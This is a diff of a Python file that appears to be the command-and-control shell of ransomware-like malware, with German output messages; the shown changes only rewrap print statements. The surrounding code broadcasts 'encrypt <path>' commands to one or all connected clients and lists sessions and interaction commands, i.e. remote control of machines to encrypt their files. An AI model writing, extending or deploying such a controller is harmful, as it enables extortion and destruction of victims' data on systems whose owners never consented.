@@ -128,7 +128,9 @@ def server_shell():
                     try:
                         target_path = command.split(" ", 1)[1]
                         broadcast_command(f"encrypt {target_path}")
-                        print(f"[+] Encrypt Befehl für Pfad '{target_path}' an alle Clients gesendet")
+                        print(
+                            f"[+] Encrypt Befehl für Pfad '{target_path}' an alle Clients gesendet"
+                        )
                     except IndexError:
                         print("[!] Usage: broadcast encrypt <target_path>")
                 else:
@@ -139,7 +141,9 @@ def server_shell():
             print("[*] Verfügbare Befehle:")
             print("  sessions                    - Zeige alle aktiven Sessions")
             print("  interact <id>               - Interagiere mit einem Client")
-            print("  encrypt <id> <path>         - Verschlüssle Pfad auf spezifischem Client")
+            print(
+                "  encrypt <id> <path>         - Verschlüssle Pfad auf spezifischem Client"
+            )
             print("  broadcast <cmd>             - Sende Befehl an alle Clients")
             print("  broadcast encrypt <path>    - Verschlüssle Pfad auf allen Clients")
             print("  exit                        - Server beenden")
@@ -149,7 +153,9 @@ def server_shell():
                     client_socket.close()
             sys.exit(0)
         else:
-            print("[!] Commands: sessions, interact <id>, encrypt <id> <path>, broadcast <cmd>, help, exit")
+            print(
+                "[!] Commands: sessions, interact <id>, encrypt <id> <path>, broadcast <cmd>, help, exit"
+            )
 
 
 def main():
